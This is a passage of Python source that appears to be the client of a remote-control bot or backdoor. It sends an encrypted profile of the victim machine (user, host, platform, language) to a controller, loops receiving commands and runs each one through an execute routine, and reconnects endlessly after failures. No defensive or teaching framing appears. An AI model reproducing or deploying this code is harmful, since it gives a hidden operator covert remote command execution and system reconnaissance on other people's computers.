            chunk = recv_all(sock, len_data)
            buf.extend(decompressor.decompress(chunk))

        buf.extend(decompressor.flush())

        return memoryview(buf)


    def recv_text(sock):
        decompressor = decompressobj(wbits=-15)

        with StringIO() as buf:
            while True:
                len_data = int.from_bytes(recv_all(sock, 4), 'big')

                if not len_data:  
                    sock.sendall(b'\x00')
                    break

                sock.sendall(b'\x01')

                chunk = recv_all(sock, len_data)
                buf.write(decrypt(decompressor.decompress(chunk).decode()))

            last = decompressor.flush()

            if last:
                buf.write(decrypt(last.decode()))

            return buf.getvalue()


    def recv(sock, b=False):
        return (recv_bytes if b else recv_text)(sock)


    send(client, session)

    client.recv(64)
    send(client, f'{NODE}\\\\{USER}')

    client.recv(64)
    send(client, f'''HOST: {sip}:{PORT}
ARCHITECTURE: {ARCHITECTURE}
PROCESSOR: {PROCESSOR}
PLATFORM: {OS["platform"]} {OS["release"]} {OS["edition"]}
NODE: {NODE}
USER: {USER}
LANG: {LANG}
ENCODING: {ENCODING}
CONNECTION DATE: {session_date[0]} | {session_date[1]}''')

    while True:
        client.recv(64) 

        cmd = recv(client)

        match cmd:
            case 'empty':
                continue
            case 'session':
                send(client, session)
                continue
            case 'exit':
                return 
            case 'restart': 
                if os.path.isfile(FILE_BOT_RESTART):
                    os.remove(FILE_BOT_RESTART)
                    continue
            case 'gethost':
                send(client, f'{sip}:{PORT}')
                continue
        
        send_execute = lambda data, doc='': send(client, data, doc)
        recv_execute = lambda b=False: recv(client, b)

        try:
            execute(cmd, send_execute, recv_execute, client)
        except BaseException as error:
            send(client, f'{type(error).__name__}({error})')

        sleep(0.01)


def main():
    init()

    while True:
        try:
            server()
        except:
            sleep(10)


if __name__ == '__main__': main()